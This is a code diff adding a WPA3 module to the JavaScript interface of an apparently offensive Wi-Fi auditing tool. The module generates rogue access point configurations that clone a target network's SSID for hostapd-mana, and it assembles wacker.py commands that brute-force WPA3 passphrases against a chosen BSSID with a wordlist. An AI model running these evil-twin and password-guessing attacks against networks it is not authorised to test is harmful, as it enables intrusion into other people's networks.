@@ -777,6 +777,64 @@ window.launchCustomCrack = async function () {
   return invokeAttack('crack_custom', { hashFile: hash, attack, wordlist: wl, mask, rule, session: sess });
 };
 
+// ── Módulo WPA3 ─────────────────────────────────────────────────────────
+window.useTargetForWpa3 = function () {
+  const sel = $('attack-bssid');
+  if (!sel?.value) { log('Selecciona un objetivo BSSID primero.', 'warn'); return; }
+  const bssidInput = $('wpa3-bssid');
+  if (bssidInput) bssidInput.value = sel.value;
+  const opt = sel.options[sel.selectedIndex]?.text || '';
+  const ssid = opt.split('·')[0]?.trim();
+  const ssidInput = $('wpa3-ssid');
+  if (ssid && ssidInput) ssidInput.value = ssid;
+};
+
+window.wpa3Audit = async function () {
+  const bssid = valOrEmpty($('wpa3-bssid').value);
+  if (!bssid) { log('Especifica el BSSID a auditar.', 'warn'); return; }
+  try {
+    const a = await window.__invoke('wpa3_audit', { bssid });
+    const pre = $('wpa3-out');
+    const txt = `${a.title}\n${a.detail}\nMFP: ${a.mfp}\nConfirmar: ${a.confirm_cmd_linux}\n${(a.next_steps || []).join('\n')}`;
+    if (pre) pre.textContent = txt;
+    log(`[wpa3] ${a.ssid} (${a.bssid}): ${a.title}`, 'info');
+  } catch (e) {
+    log(`[wpa3] ERROR: ${e}`, 'error');
+  }
+};
+
+window.genRogueConf = async function () {
+  const ssid = valOrEmpty($('wpa3-ssid').value);
+  const ch = parseInt(valOrEmpty($('wpa3-chan').value) || '1');
+  const iface = valOrEmpty($('wpa3-iface').value) || undefined;
+  const out = valOrEmpty($('wpa3-confout').value) || undefined;
+  if (!ssid) { log('Especifica el SSID a clonar.', 'warn'); return; }
+  try {
+    const r = await window.__invoke('gen_rogue_conf', { ssid, channel: ch, iface, outputPath: out });
+    const pre = $('rogue-out');
+    if (pre) pre.textContent = r.output;
+    log(`[rogue] .conf generado para "${ssid}" CH${ch}. Úsalo con hostapd-mana en Kali.`, 'ok');
+  } catch (e) {
+    log(`[rogue] ERROR: ${e}`, 'error');
+  }
+};
+
+window.fillWacker = function () {
+  const bssid = valOrEmpty($('wpa3-bssid').value) || '<BSSID>';
+  const opt = $('attack-bssid')?.options[$('attack-bssid')?.selectedIndex]?.text || '';
+  const ssid = opt.split('·')[0]?.trim() || valOrEmpty($('wpa3-ssid').value) || '<SSID>';
+  const wl = valOrEmpty($('wpa3-wl').value) || '<wordlist>';
+  const iface = valOrEmpty($('wpa3-miface').value) || '<iface-managed>';
+  const pre = $('wacker-out');
+  if (pre) {
+    pre.textContent =
+      '# En Kali (adaptador en MANAGED mode, no monitor):\n' +
+      '# git clone <repo-wacker> && revisa --help (los flags varían por versión)\n' +
+      `python3 wacker.py --ssid "${ssid}" --bssid ${bssid} --wordlist ${wl} --interface ${iface}\n` +
+      '# Lento (~1 intento/s, con rate-limit del AP) y ruidoso. Solo vs claves débiles.';
+  }
+};
+
 // ── Background attack state ──────────────────────────────────────────────
 let currentAttackId = null;
 
